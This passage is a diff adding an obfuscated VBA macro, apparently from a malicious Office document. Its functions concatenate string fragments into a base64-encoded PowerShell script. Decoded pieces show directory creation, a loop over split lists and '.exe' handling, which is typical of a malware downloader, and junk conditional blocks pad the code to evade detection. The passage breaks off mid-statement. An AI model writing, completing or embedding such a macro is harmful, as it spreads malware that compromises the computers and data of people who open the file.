+q_fWJ_ = "8AUwBY" + "ADc" + "AdwBmA" + "EwA" + "YwA" + "gAD0"
+If rlS_5FJ Or M__TQ_D Then
+' STRIPPED LINE
+End If
+Gyn_GE = "AIA" + "AoAF" + "sAc" + "wB0A" + "HIAaQB" + "uAG" + "cAXQAo"
+If xa_DnmH Or I_ddd_ Then
+' STRIPPED LINE
+End If
+If o6_iU4 Or lbL__C Then
+' STRIPPED LINE
+End If
+uIvLqZJ = "ACIAew" + "AxAD" + "MAf" + "QB7AD" + "YAf" + "QB7ADI" + "AOAB9A" + "HsA" + "MAB"
+NSp_AV_ = zq_jS_W + XSJ1WA_ + ne_w3r_ + N8ep_Ek + a_X5i6q + T4LWSk + S39lks + q_fWJ_ + Gyn_GE + uIvLqZJ
+If v____r_ Or k___9d_ Then
+' STRIPPED LINE
+End If
+End Function
+Function w_xS3F()
+If ja_kbL_ Or TQ_u__ Then
+' STRIPPED LINE
+End If
+eNBe_s = "9AHsA" + "MQAyAH" + "0AewAy" + "ADQAfQ" + "B7ADIA" + "NgB9AH"
+If weha6i Or s__vVIX Then
+' STRIPPED LINE
+End If
+If X_Zr_c Or x5Z_9bx Then
+' STRIPPED LINE
+End If
+If Yai__y3 Or Y_U95U Then
+' STRIPPED LINE
+End If
+YlNZOp = "sAM" + "QA1AH0" + "Aew" + "AyAD" + "MAfQ" + "B7AD" + "UAfQ" + "B7ADEA"
+If v6Ec_N Or uR7A_R Then
+' STRIPPED LINE
+End If
+If io_7DX Or DBbCkD Then
+' STRIPPED LINE
+End If
+CbM_35 = "MAB9A" + "HsAMg" + "B9AHsA" + "MQA3" + "AH0Aew" + "AzA" + "H0Ae" + "wAyA" + "DQAfQ"
+If Vo_M2L Or Ouiaqw Then
+' STRIPPED LINE
+End If
+Sb_z6SN = "B7AD" + "EAMQB" + "9AHsAM" + "QB9AH" + "sAMgA" + "4AH" + "0Aew"
+If t9X_n_ Or sYRJYoH Then
+' STRIPPED LINE
+End If
+If c_F_w_V Or OgvLd_ Then
+' STRIPPED LINE
+End If
+If s_7T0Y Or Tg5__be Then
+' STRIPPED LINE
+End If
+mJm21A = "AxADcA" + "fQB" + "7ADE" + "AOQB" + "9AHsAM" + "gA2AH" + "0Ae" + "wAxA" + "DUAfQ"
+If oKEddj Or vBRXY55 Then
+' STRIPPED LINE
+End If
+If R5M4B_ Or q_JW__ Then
+' STRIPPED LINE
+End If
+If kb_89oN Or LePY__Z Then
+' STRIPPED LINE
+End If
+Vx___AB = "B7ADgA" + "fQB7" + "ADUA" + "fQB7AD" + "IANAB9" + "AHsAMQ" + "AwAH0" + "Aew"
+If Tt4u4__ Or uho_lI Then
+' STRIPPED LINE
+End If
+If h0__7aG Or cqZNBV_ Then
+' STRIPPED LINE
+End If
+If wtm_ZZA Or tZVGD_ Then
+' STRIPPED LINE
+End If
+lu___D = "AxAD" + "QAfQ" + "B7ADI" + "ANQB" + "9AH" + "sAMQA4"
+If RbUTUaL Or z_niA_V Then
+' STRIPPED LINE
+End If
+B_Kn6T8 = "AH0Ae" + "wAxA" + "DkAf" + "QB7AD" + "IANwB9" + "AHsAN"
+If tpi_Lq Or NVpX_W Then
+' STRIPPED LINE
+End If
+If GK3ybrK Or y_RzWp_ Then
+' STRIPPED LINE
+End If
+I_wEBm_ = "AB9AH" + "sAM" + "gA0A" + "H0A" + "ewA"
+If V_9g__ Or g__ONS Then
+' STRIPPED LINE
+End If
+iMtVRQa = "xADEA" + "fQB" + "7AD" + "IAf" + "QB7ADI" + "AMgB"
+If vVsnkS Or jnAjSL6 Then
+' STRIPPED LINE
+End If
+If M_vS_Xb Or HE__mr_ Then
+' STRIPPED LINE
+End If
+A_UGx__ = "9AHsAM" + "gAwA" + "H0AewA" + "xADkA" + "fQB" + "7ADc" + "AfQ" + "B7AD"
+If hfjj_vg Or nDEO_i Then
+' STRIPPED LINE
+End If
+j76OZ_ = "IAMQB9" + "AHsAMw" + "B9AH" + "sAOQ" + "B9AHsA" + "MgA0" + "AH0A" + "ewAx"
+w_xS3F = eNBe_s + YlNZOp + CbM_35 + Sb_z6SN + mJm21A + Vx___AB + lu___D + B_Kn6T8 + I_wEBm_ + iMtVRQa + A_UGx__ + j76OZ_
+If oEcB_hI Or Y_yalnE Then
+' STRIPPED LINE
+End If
+If aFJQH__ Or TAPCEfr Then
+' STRIPPED LINE
+End If
+End Function
+Function VcVzN_()
+If D_c_p_ Or Nooyp_ Then
+' STRIPPED LINE
+End If
+If y8_iy5j Or ZRP3k_ Then
+' STRIPPED LINE
+End If
+If l_fcpVX Or jq7T_tb Then
+' STRIPPED LINE
+End If
+zcDmJf_ = "ADcA" + "fQB7A" + "DEA" + "NgB9" + "AHs" + "AMgA1A" + "H0AIgA" + "gAC0A" + "ZgA"
+If yxClob Or DNnS7P Then
+' STRIPPED LINE
+End If
+If N69_xuj Or k_qhvUj Then
+' STRIPPED LINE
+End If
+If M2_l__ Or a__mbr Then
+' STRIPPED LINE
+End If
+Rw5__aJ = "nAHUA" + "JwAsA" + "CcAa" + "QAn" + "ACw" + "AJwB" + "BAC"
+If joN_N_ Or Er_ADtz Then
+' STRIPPED LINE
+End If
+If LKa__M Or rHZRSP Then
+' STRIPPED LINE
+End If
+If tdd__v Or zIj_vt Then
+' STRIPPED LINE
+End If
+bt__h_l = "cAL" + "AAnAG" + "UAJw" + "AsACc" + "AcwAn" + "ACwAJw"
+If f_IK__z Or aDfjap Then
+' STRIPPED LINE
+End If
+KhBoW9C = "B0A" + "CcALA" + "AnAE" + "sAJ" + "wAsAC"
+If S__A4ba Or Q8a4A_ Then
+' STRIPPED LINE
+End If
+If fcjOm_l Or ScTJZg Then
+' STRIPPED LINE
+End If
+gij__S1 = "cAQwAn" + "ACw" + "AJw" + "BGACcA" + "LAA" + "nAF" + "kAJwA" + "sACcAd"
+If RUqvXPV Or IS_mv1_ Then
+' STRIPPED LINE
+End If
+uU1po_ = "wAnAC" + "wAJ" + "wBNA" + "CcA" + "LAAnAD"
+If OmAVf__ Or bO__bH Then
+' STRIPPED LINE
+End If
+If kgz_F_ Or hv_3__v Then
+' STRIPPED LINE
+End If
+lG9TR_N = "oAJwAs" + "ACcAa" + "AAnACw" + "AJw" + "BJA"
+VcVzN_ = zcDmJf_ + Rw5__aJ + bt__h_l + KhBoW9C + gij__S1 + uU1po_ + lG9TR_N
+If m_QA__ Or dGu__r Then
+' STRIPPED LINE
+End If
+If a2_9_R_ Or iXm__d Then
+' STRIPPED LINE
+End If
+If lEq3_B Or OX_a3_L Then
+' STRIPPED LINE
+End If
+End Function
+Function E_F_Ud8()
+If kpBJ_d Or sH_Xp8 Then
+' STRIPPED LINE
+End If
+If d_RI_M Or AI9B_v_ Then
+' STRIPPED LINE
+End If
+If yCs4L_ Or HGfAgsK Then
+' STRIPPED LINE
+End If
+tWtrCVc = "CcA" + "LAAnAG" + "8AJ" + "wAsA" + "CcAVQ" + "AnACw" + "AJwBSA"
+If kPlz7G_ Or t4__sE Then
+' STRIPPED LINE
+End If
+Y2zc7V = "CcALAA" + "nAGQ" + "AJwAsA" + "CcAT" + "wAnA" + "CwAJwB"
+If Y_7al7d Or jV_LJ_7 Then
+' STRIPPED LINE
+End If
+If pPFC63k Or BiCLS_h Then
+' STRIPPED LINE
+End If
+If C___H7x Or gjiLz_8 Then
+' STRIPPED LINE
+End If
+g2xk3s = "EAC" + "cALAAn" + "AGsA" + "JwAsA" + "CcAbA" + "AnACwA" + "JwB" + "mACc" + "ALA"
+If heO_Oru Or x_k_to6 Then
+' STRIPPED LINE
+End If
+If Tp7rK_ Or Wy_3sID Then
+' STRIPPED LINE
+End If
+Xq_Zdk_ = "AnAF" + "wAJwAs" + "ACcAT" + "gAnAC" + "wAJ" + "wBT"
+If aXC_cm_ Or sa_yx_J Then
+' STRIPPED LINE
+End If
+t_lu6W = "ACcA" + "LAAn" + "AFcA" + "JwAsA" + "CcAY"
+If kGBOgyH Or xHwyw_ Then
+' STRIPPED LINE
+End If
+vbns__ = "wAnACk" + "AKQ" + "A7A" + "CQAS" + "wBGAE"
+If P5WFvdl Or l____6 Then
+' STRIPPED LINE
+End If
+If E_V1Ce Or x__A6_S Then
+' STRIPPED LINE
+End If
+mBNT2_R = "gAT" + "wBYAC" + "AAPQAg" + "ACgAWw" + "BzAHQA" + "cgBpAG" + "4AZwB"
+If F_UsN__ Or K5_qNp Then
+' STRIPPED LINE
+End If
+If M_i_nO Or dxAH__d Then
+' STRIPPED LINE
+End If
+If pr_j8_ Or m8j__B Then
+' STRIPPED LINE
+End If
+l_N1G0c = "dACg" + "AIgB" + "7AD" + "YAfQ" + "B7A" + "DIAM"
+E_F_Ud8 = tWtrCVc + Y2zc7V + g2xk3s + Xq_Zdk_ + t_lu6W + vbns__ + mBNT2_R + l_N1G0c
+If tcY__e Or RS9owu_ Then
+' STRIPPED LINE
+End If
+If U52_xlF Or t_A0xUL Then
+' STRIPPED LINE
+End If
+End Function
+Function DQUlnB()
+If rj_D_a Or w_lta_ Then
+' STRIPPED LINE
+End If
+If F19AJx Or xx3G_1 Then
+' STRIPPED LINE
+End If
+C_ZxLd = "AB9AH" + "sAMg" + "A3AH" + "0Aew" + "AwAH0A" + "ewA" + "xADAA" + "fQB7A" + "DIAMwB"
+If Q__14p Or L_4_TN Then
+' STRIPPED LINE
+End If
+If KG3vfu Or J_AZ_n Then
+' STRIPPED LINE
+End If
+If wjQ___ Or HSGr_x Then
+' STRIPPED LINE
+End If
+UD_wvA = "9AHs" + "AMg" + "A0AH" + "0AewA" + "xADYAf" + "QB7" + "ADIA" + "MgB9" + "AHsA"
+If UnNLT_ Or L_pbcn Then
+' STRIPPED LINE
+End If
+If eR___X Or r4Z___ Then
+' STRIPPED LINE
+End If
+If M4R_HY Or FLop7rX Then
+' STRIPPED LINE
+End If
+NVx_Wm5 = "MQA5A" + "H0AewA" + "5AH0" + "AewAxA" + "DcAfQ" + "B7ADE" + "ANQB9A"
+If eN_Cfu_ Or R_i57J Then
+' STRIPPED LINE
+End If
+If U_DFL_ Or TwbH_Ai Then
+' STRIPPED LINE
+End If
+B5Rh_b = "HsAMQ" + "AxA" + "H0A" + "ewAy" + "ADMAf" + "QB7AD" + "EAMw" + "B9AH"
+If B_Vhr_ Or x___P_ Then
+' STRIPPED LINE
+End If
+SdBZv_ = "sAMQB" + "9AHsAN" + "QB9" + "AHsAM" + "QA1AH0"
+If Y_vT3JY Or wO___Tv Then
+' STRIPPED LINE
+End If
+r3H__k6 = "AewAxA" + "DQAf" + "QB7ADI" + "ANAB9A" + "HsAMQ" + "A2AH"
+If WQBR_q Or sm0QYLK Then
+' STRIPPED LINE
+End If
+If bhX_OB Or UIEL_m Then
+' STRIPPED LINE
+End If
+V6aJ__ = "0Aew" + "A3A" + "H0Ae" + "wAzA" + "H0AewA" + "yADMA" + "fQB7A"
+DQUlnB = C_ZxLd + UD_wvA + NVx_Wm5 + B5Rh_b + SdBZv_ + r3H__k6 + V6aJ__
+If hkN_nW Or xGR2x6 Then
+' STRIPPED LINE
+End If
+End Function
+Function Add51_()
+If dos_tO Or iiH_jp Then
+' STRIPPED LINE
+End If
+If UK_d6Tz Or zm_2Si_ Then
+' STRIPPED LINE
+End If
+If xEcREU Or cfD_cX Then
+' STRIPPED LINE
+End If
+K8_4JSu = "DkA" + "fQB" + "7AD" + "EAMgB" + "9AH" + "sAMgA1" + "AH0Ae" + "wAxADg" + "AfQB7"
+If Ci__BQ Or l__C_n Then
+' STRIPPED LINE
+End If
+If sHSjTP_ Or i7H_8T_ Then
+' STRIPPED LINE
+End If
+Tro6Tj = "ADEA" + "NAB" + "9AHsA" + "MgA2A" + "H0Aew" + "AyA" + "H0Aew" + "AyADMA"
+If ZX1zvx_ Or E_v_Q_ Then
+' STRIPPED LINE
+End If
+Sra_R_ = "fQB7" + "ADE" + "AMwB" + "9AHsAM" + "QA3"
+If l_Xy__c Or r_ak__g Then
+' STRIPPED LINE
+End If
+If qI3n8VD Or c7v_Z39 Then
+' STRIPPED LINE
+End If
+If vN9Dk3v Or vZ_0gw Then
+' STRIPPED LINE
+End If
+z__7DxM = "AH0" + "AewAyA" + "DEAfQ" + "B7A" + "DEAOAB" + "9AHsA" + "MQA2" + "AH0Aew" + "A1AH0"
+If WuQ__b Or SlLS___ Then
+' STRIPPED LINE
+End If
+v__FZ28 = "AewA0A" + "H0Aew" + "AxADEA" + "fQB7" + "ADg" + "AfQAiA"
+If vt_rPOy Or qMF3O52 Then
+' STRIPPED LINE
+End If
+If eKX_tvT Or otrNVZh Then
+' STRIPPED LINE
+End If
+frmJHDE = "CAALQB" + "mACc" + "AdQAnA" + "CwAJ" + "wBpACc" + "ALA" + "AnAH"
+If QokJai Or eUP_lZd Then
+' STRIPPED LINE
+End If
+p_rIifD = "MAJwA" + "sACc" + "AdAAn" + "ACw" + "AJwB" + "LACc"
+Add51_ = K8_4JSu + Tro6Tj + Sra_R_ + z__7DxM + v__FZ28 + frmJHDE + p_rIifD
+If g__ZEO Or Z8Xu7m Then
+' STRIPPED LINE
+End If
+If xv5_Ym Or Q_vzpoI Then
+' STRIPPED LINE
+End If
+If jbrLX8 Or xnsLJ_l Then
+' STRIPPED LINE
+End If
+End Function
+Function FDrjUo()
+If lk_3aF Or f5_G_d Then
+' STRIPPED LINE
+End If
+E__JlK_ = "ALAAnA" + "EMA" + "JwAsA" + "CcAS" + "AAnACw" + "AJwBG" + "ACcALA" + "AnAF"
+If p_yoHk Or Sb4__ve Then
+' STRIPPED LINE
+End If
+pM2Gfs8 = "kAJwAs" + "ACcAd" + "wAnACw" + "AJwA" + "6ACcA" + "LAA"
+If vhI_TU Or om4CNE Then
+' STRIPPED LINE
+End If
+Jcpm1H = "nAEU" + "AJwAs" + "ACcA" + "SQA" + "nACw"
+If hr_i__5 Or G__Hyo Then
+' STRIPPED LINE
+End If
+If R_c20R Or VqRo_a Then
+' STRIPPED LINE
+End If
+If MGcM_1e Or j3KSw_O Then
+' STRIPPED LINE
+End If
+pTS7_J = "AJw" + "BtACcA" + "LAA" + "nAG" + "8AJw" + "AsA" + "CcAU" + "gAn" + "ACw"
+If u6np_q_ Or KAmi_A Then
+' STRIPPED LINE
+End If
+Q_tVjo = "AJwB" + "PACcA" + "LAAnA" + "GEAJ" + "wAsACc" + "ARA"
+If svpz9_x Or zixgL_ Then
+' STRIPPED LINE
+End If
+If rdUs__I Or bzWsIi Then
+' STRIPPED LINE
+End If
+If R_Yasg5 Or SFBP55A Then
+' STRIPPED LINE
+End If
+P_qbnj = "AnACw" + "AJwB" + "UACcAL" + "AAnAGs" + "AJwAsA" + "CcAbAA"
+If v6_4O1_ Or A_b_Y_ Then
+' STRIPPED LINE
+End If
+If d_42GZE Or GPGT_J Then
+' STRIPPED LINE
+End If
+a8F__W6 = "nACwAJ" + "wBmACc" + "ALA" + "AnAF" + "wAJw"
+If Xrc_Otj Or R_kCv__ Then
+' STRIPPED LINE
+End If
+If qggT_Rn Or Z7d__Gt Then
+' STRIPPED LINE
+End If
+B_3bGN = "AsAC" + "cAU" + "wAnAC" + "wAJ" + "wBu" + "ACcALA"
+If x7_udr Or fet_a__ Then
+' STRIPPED LINE
+End If
+If jOrZVB Or R9e5YT Then
+' STRIPPED LINE
+End If
+pU3UHE = "AnA" + "FcA" + "JwAsA" + "CcAYwA" + "nACkA" + "KQA7A" + "CQAbAB" + "1ADgAO" + "QBO"
+If A__S__ Or bp6N6J Then
+' STRIPPED LINE
+End If
+If tM_KM_ Or AmVF_H Then
+' STRIPPED LINE
+End If
+scx_ol = "AEMAN" + "wBIAHE" + "AIA" + "A9A" + "CAAI" + "gBtAG" + "EAbAB" + "kAG8A" + "YwBrA"
+If MNB_oR_ Or w__0eD_ Then
+' STRIPPED LINE
+End If
+If sKLEY2L Or c_EYyU Then
+' STRIPPED LINE
+End If
+If MLVbqG Or MjqdFYo Then
+' STRIPPED LINE
+End If
+fPbMQL = "GsAZQB" + "5ACI" + "AOwAkA" + "E8A" + "QgA5A" + "DcAYQ" + "BaAC"
+FDrjUo = E__JlK_ + pM2Gfs8 + Jcpm1H + pTS7_J + Q_tVjo + P_qbnj + a8F__W6 + B_3bGN + pU3UHE + scx_ol + fPbMQL
+If U___K_a Or VWT__M Then
+' STRIPPED LINE
+End If
+If gLC3yY Or v_6l_R3 Then
+' STRIPPED LINE
+End If
+End Function
+Function V_wC_W()
+If kZ__AQU Or qKYf_W Then
+' STRIPPED LINE
+End If
+If gu_l__q Or J6G9_V9 Then
+' STRIPPED LINE
+End If
+If sOQ___b Or j_sv_jW Then
+' STRIPPED LINE
+End If
+MSYSA_ = "AAPQ" + "AgA" + "CQAZ" + "ABoAG" + "UAb" + "wBF" + "AE8AM"
+If T___j_ Or MXq2x_ Then
+' STRIPPED LINE
+End If
+If p5UwuMw Or dqSEHZ Then
+' STRIPPED LINE
+End If
+XZKhNgy = "QB5A" + "CsA" + "IgA" + "2AC4Aa" + "gBwAGc" + "AIg"
+If v_p05G Or ChzRvw Then
+' STRIPPED LINE
+End If
+SkI_PtP = "A7AC" + "QAZw" + "BOAE4" + "AaQB" + "wAFcAI" + "AA9" + "ACAAJ"
+If Ohx_o_z Or KJtb_U Then
+' STRIPPED LINE
+End If
+If d__jTF Or hJU___ Then
+' STRIPPED LINE
+End If
+gV_w_fv = "ABjA" + "DQAdAA" + "2AGIA" + "WgBu" + "AHUAIA"
+If gHb_8_ Or qMS__W Then
+' STRIPPED LINE
+End If
+If ahmCqn_ Or O___LK5 Then
+' STRIPPED LINE
+End If
+If U0___d_ Or s4_D_i Then
+' STRIPPED LINE
+End If
+E_m05d = "ArACAA" + "JABn" + "AE4AT" + "gBpAH" + "AAVwA" + "7ACQA"
+If hOCd_b Or u__kNNG Then
+' STRIPPED LINE
+End If
+If vf_lHtb Or KD67X_V Then
+' STRIPPED LINE
+End If
+If tUH5__5 Or O_tj__ Then
+' STRIPPED LINE
+End If
+SoUz_W_ = "SgB" + "NAH" + "EAdwB" + "sAG" + "wASgBk" + "ADcA" + "awA" + "9ADEAO" + "wAkAE"
+If B9_thU3 Or F9v__Sb Then
+' STRIPPED LINE
+End If
+If GB_L_DL Or v_O4Tz Then
+' STRIPPED LINE
+End If
+If Spc_jy_ Or yCf_ozU Then
+' STRIPPED LINE
+End If
+L_Y___ = "EAeQB" + "EAGkAc" + "QBo" + "AFgA" + "UwB4A" + "D0AIgA"
+If RVPzSzE Or Z7zn10v Then
+' STRIPPED LINE
+End If
+KC_cpf2 = "iADsA" + "ZgBv" + "AHIAI" + "AAoACQ" + "AUgB" + "NAG" + "gAdg" + "BSAGIA" + "aABu"
+If x_t__r_ Or tnTzT_p Then
+' STRIPPED LINE
+End If
+F_qyd8 = "AD0" + "AMAA7" + "ACQAUg" + "BNAGgA" + "dgB" + "SAGIA" + "aAB"
+If YUx_2p_ Or a_ZOE1 Then
+' STRIPPED LINE
+End If
+a_64E_C = "uACA" + "ALQ" + "BsAHQ" + "AIAA" + "kAEc" + "AQwBt"
+V_wC_W = MSYSA_ + XZKhNgy + SkI_PtP + gV_w_fv + E_m05d + SoUz_W_ + L_Y___ + KC_cpf2 + F_qyd8 + a_64E_C
+If IrD_01I Or ungqVi Then
+' STRIPPED LINE
+End If
+End Function
+Function l_oD0j()
+If U_O_Gd Or kini8S Then
+' STRIPPED LINE
+End If
+If Z_zJDt Or TyS_MK Then
+' STRIPPED LINE
+End If
+bg_Dkd = "AHoA" + "dABOAF" + "cAegAu" + "AGw" + "AZQBu" + "AGcA" + "dABoAD" + "sAJ"
+If Qd5_nd Or Wutke_ Then
+' STRIPPED LINE
+End If
+If xL__a3 Or V9z0QSj Then
+' STRIPPED LINE
+End If
+If iz_D___ Or lopTP__ Then
+' STRIPPED LINE
+End If
+o0_4_Eo = "ABS" + "AE0Aa" + "AB2A" + "FIAYgB" + "oAG4AP" + "QAkAFI" + "ATQB" + "oAH"
+If d_MEl_ Or Rfw_MNR Then
+' STRIPPED LINE
+End If
+If m_wJJw Or dXl_4_ Then
+' STRIPPED LINE
+End If
+If zgH__eU Or ID3JTM Then
+' STRIPPED LINE
+End If
+RPH7JZH = "YAU" + "gBiAG" + "gAbg" + "ArA" + "DMA"
+If DghL6_ Or Hv_mIu_ Then
+' STRIPPED LINE
+End If
+JR3m8v = "KQAg" + "AHsAJ" + "ABBAHk" + "ARAB" + "pAH"
+If P_zM__ Or X_dWgh Then
+' STRIPPED LINE
+End If
+K08_b35 = "EAaAB" + "YAFMAe" + "AA9AC" + "QAQQ" + "B5AEQA" + "aQBxAG" + "gAWABT" + "AHgAKw"
+If nmn___ Or UO_BqHA Then
+' STRIPPED LINE
+End If
+If b6q__Dq Or xV9jh_W Then
+' STRIPPED LINE
+End If
+d_0RNh_ = "AgAC" + "gAWwB" + "zAHQA" + "cgBpA" + "G4A" + "ZwBdAF" + "sAY"
+If Y_aWIL_ Or Bq_9P9 Then
+' STRIPPED LINE
+End If
+If B_x0VW Or po_T1yR Then
+' STRIPPED LINE
+End If
+If NC__F_T Or iQh_EJ Then
+' STRIPPED LINE
+End If
+F__MVoI = "wBoAGE" + "AcgB" + "dACgAK" + "ABbAG" + "kAbgB" + "0AF0A"
+If hmtRQM_ Or o9L_TkI Then
+' STRIPPED LINE
+End If
+If v__gE_O Or D__sZc Then
+' STRIPPED LINE
+End If
+If ZcNR__8 Or wo_jD_2 Then
+' STRIPPED LINE
+End If
+KNoit1_ = "KAA" + "kAE" + "cAQwBt" + "AHo" + "AdA" + "BOAFcA" + "egBb"
+If cqShsF Or B08_w2 Then
+' STRIPPED LINE
+End If
+If VSBpzgB Or o_xlP6 Then
+' STRIPPED LINE
+End If
+If uG_Ksvb Or OA9mI_ Then
+' STRIPPED LINE
+End If
+JoZI6C = "ACQAU" + "gBNAG" + "gAd" + "gBS" + "AGIA" + "aABuA" + "C4AL" + "gAoACQ" + "AUgB"
+If H_r_ZP Or Z8tc__ Then
+' STRIPPED LINE
+End If
+If f_86ur Or E02U0_R Then
+' STRIPPED LINE
+End If
+fn__CsO = "NAGg" + "AdgBSA" + "GIAa" + "ABuAC" + "sAMgAp" + "AF0A"
+l_oD0j = bg_Dkd + o0_4_Eo + RPH7JZH + JR3m8v + K08_b35 + d_0RNh_ + F__MVoI + KNoit1_ + JoZI6C + fn__CsO
+If K_mW__ Or xdP___ Then
+r_Ug__ = (940487185 - Rnd(Q36WyH)) + 628946844 / Log(gb_y2f_ / Atn(322712366) * 104444741 * CLng(326362052)) * gy_jRg - Hex(308201292 - NCwXpBE) - 34640991 / 873010561
+End If
+If oKfoOn Or eQF7_n Then
+' STRIPPED LINE
+End If
+If n_n7YB Or FIY0x8_ Then
+' STRIPPED LINE
+End If
+End Function
+Function TNSw__()
+If FEpldJG Or AAqt_S Then
+' STRIPPED LINE
+End If
+SytrzFR = "IAAt" + "AGoAb" + "wBpAG" + "4AI" + "AAnAC" + "cAK" + "QApAC" + "0AJ"
+If GylxxG Or a__T__ Then
+' STRIPPED LINE
+End If
+If HXP85k_ Or I10K9S Then
+' STRIPPED LINE
+End If
+If YS4vFc0 Or kWWf_j Then
+' STRIPPED LINE
+End If
+BjOb6lz = "ABK" + "AE0AcQ" + "B3AG" + "wAbABK" + "AGQ" + "ANw" + "BrAC" + "kAKQA"
+If IiZM_vd Or HAPAhZ_ Then
+' STRIPPED LINE
+End If
+If Z_w_Oa Or D_4u_wA Then
+' STRIPPED LINE
+End If
+If rdiX1_5 Or mXRlV_ Then
+' STRIPPED LINE
+End If
+P7a_EkN = "7ACQ" + "ASgBNA" + "HEA" + "dwB" + "sAGwA" + "SgBkAD"
+If Zc4Icc Or cgPNe0d Then
+' STRIPPED LINE
+End If
+If ycw_N9 Or Oy__meY Then
+' STRIPPED LINE
+End If
+If T3EI_85 Or e8bm__2 Then
+' STRIPPED LINE
+End If
+e_W7_U9 = "cAawA" + "9ACQ" + "ASgBNA" + "HEAdwB" + "sAGwAS"
+If OEBq_7n Or sZ___KO Then
+' STRIPPED LINE
+End If
+If X_HMVpF Or u_IVGpG Then
+' STRIPPED LINE
+End If
+If QWmSWJ Or ouuC_d Then
+' STRIPPED LINE
+End If
+e8yj_I = "gBkAD" + "cAa" + "wArAD" + "EAfQA" + "7AE" + "4AZQB" + "3AC" + "0ASQB" + "0AGUA"
+If B__46Qt Or Gw_ge2 Then
+' STRIPPED LINE
+End If
+nkoFR87 = "bQAgAC" + "0AcAB" + "hAH" + "QAa" + "AAg" + "ACQAS" + "gBlAE8" + "AUwBYA" + "DcAd"
+If v__S__T Or UnyPB_ Then
+' STRIPPED LINE
+End If
+If h15POa_ Or uR__Ar Then
+' STRIPPED LINE
+End If
+MoV_i_ = "wBmAE" + "wAYwAg" + "AC0Ab" + "gBhA" + "G0AZQA" + "gACQ" + "AbA" + "B1ADg" + "AOQBOA"
+If Q_wQKO Or nuZ_1b Then
+' STRIPPED LINE
+End If
+If k__8rK_ Or GUGpx__ Then
+' STRIPPED LINE
+End If
+If n46__af Or g_1aO__ Then
+' STRIPPED LINE
+End If
+YcB2CW = "EMAN" + "wBI" + "AHE" + "AIAAt" + "AHYAYQ" + "BsAH" + "UAZ" + "QAgA"
+TNSw__ = SytrzFR + BjOb6lz + P7a_EkN + e_W7_U9 + e8yj_I + nkoFR87 + MoV_i_ + YcB2CW
+If q__uytZ Or e_v6V0 Then
+' STRIPPED LINE
+End If
+End Function
+Function YXYjO1()
+If z_o_y_ Or u_MCly Then
+' STRIPPED LINE
+End If
+If Pklh_y Or aJ_th3_ Then
+' STRIPPED LINE
+End If
+If pf__e_w Or vgNp936 Then
+' STRIPPED LINE
+End If
+qK____E = "CQA" + "QQB5AE" + "QAaQBx" + "AGgAWA" + "BTAHg" + "AIA" + "AtAG"
+If cNAnAF Or n___7sj Then
+' STRIPPED LINE
+End If
+X9pl_A_ = "YAb" + "wByAGM" + "AZQ" + "AgAH" + "wAIAB"
+If CK_US_ Or Qx_KfS_ Then
+' STRIPPED LINE
+End If
+jkyy_h = "vAHUAd" + "AAt" + "AG4" + "AdQB" + "sAGwA" + "OwAkAE"
+If Fpp6Qg_ Or B6_ESK Then
+' STRIPPED LINE
+End If
+If zHXEVh_ Or mk3EMi Then
+' STRIPPED LINE
+End If
+If PrVi_V Or F5AO_Kf Then
+' STRIPPED LINE
+End If
+Cfn0Pd = "gAY" + "wBvAFU" + "AUQB" + "QADoA" + "OgAiA" + "GMAcg" + "BlAGEA" + "dABlA"
+If k_lP__c Or l__rwE4 Then
+' STRIPPED LINE
+End If
+pdG_0B_ = "GQA" + "aQByA" + "GUA" + "YwB" + "0AG8" + "AcgB5A"
+If GCQ___w Or TXz7Px_ Then
+' STRIPPED LINE
+End If
+If G0_o_hH Or U0_u3_ Then
+' STRIPPED LINE
+End If
+TL_Q_2 = "CIA" + "KAAgAC" + "QAZA" + "BoAGUA" + "bwBFAE" + "8AMQB5" + "ACkA" + "OwBmA" + "G8Ac"
+If b_omD_V Or e_L_4i Then
+' STRIPPED LINE
+End If
+If q_al_P Or WIX7Q_ Then
+' STRIPPED LINE
+End If
+If PBEdXc_ Or U8x___v Then
+' STRIPPED LINE
+End If
+F_7__0 = "gBl" + "AGEAY" + "wBo" + "ACAA" + "KAAkAD" + "MAQg" + "A5AFYA"
+If td_R__ Or bL_Loo Then
+' STRIPPED LINE
+End If
+If LAUVY__ Or V0TW7Vz Then
+' STRIPPED LINE
+End If
+If r__ai_F Or jOQ_bE_ Then
+' STRIPPED LINE
+End If
+rG_g_G = "bQBa" + "AEoAIA" + "BpAG4" + "AIAAk" + "AGMAU" + "gBiAG" + "MAbwA2" + "AHEAMQ"
+YXYjO1 = qK____E + X9pl_A_ + jkyy_h + Cfn0Pd + pdG_0B_ + TL_Q_2 + F_7__0 + rG_g_G
+If H_s_GM_ Or g__Q_xt Then
+' STRIPPED LINE
+End If
+If QDTk_L Or hBv9ErX Then
+' STRIPPED LINE
+End If
+If n56_t7 Or b_zF_49 Then
+' STRIPPED LINE
+End If
+End Function
+Function w_1__z()
+If XR__JM Or Td__OHR Then
+' STRIPPED LINE
+End If
+If m_0wLHb Or e__s3t Then
+' STRIPPED LINE
+End If
+If COUkZHJ Or y_YJ_CM Then
+' STRIPPED LINE
+End If
+z_a_V_ = "BSA" + "FYA" + "LgBy" + "AGUAcA" + "BsAG"
+If yg_9a_ Or Ncr3n98 Then
+' STRIPPED LINE
+End If
+m_sT__ = "EAYw" + "BlACgA" + "JwBn" + "AHIAYQ" + "BtA" + "G0AYQB" + "yAGwA" + "eQAnA" + "CwA"
+If CSV1HT Or vjT___ Then
+' STRIPPED LINE
+End If
+If i__BX_G Or V_uS_mW Then
+' STRIPPED LINE
+End If
+I_sXP_ = "JwA" + "uAGU" + "AeABl" + "ACc" + "AKQ" + "AuAH" + "MAcABs"
+If TJLeGM Or i_Epv_a Then
+' STRIPPED LINE
+End If
+If s_sS___ Or kcadt_7 Then
+' STRIPPED LINE
+End If
+If aIg__rb Or jo3_wt Then
+' STRIPPED LINE
+End If
+n7__GNo = "AGkAd" + "AAoAF" + "sAY" + "wBoAGE" + "AcgBdA" + "DYANA"
+If i1S4W_ Or RK75DJ Then
+' STRIPPED LINE
+End If
+If rHG___ Or gbp0CrD Then
+' STRIPPED LINE
+End If
+aA_zTS = "ApA" + "C4Acw" + "BwAGwA" + "aQB0" + "ACgAW" + "wBjAGg" + "AYQ"
+If kd9vVTF Or S_8V_1_ Then
+' STRIPPED LINE
+End If
+If Xd__pP Or z8tw8C Then
+' STRIPPED LINE
+End If
+If Ndh__S Or dA5___ Then
+' STRIPPED LINE
+End If
+z1h4_9 = "ByAF0A" + "MQA" + "yADQ" + "AKQA" + "uAHIAZ" + "QBw"
+If Vc8IPTi Or jwd5V3O Then
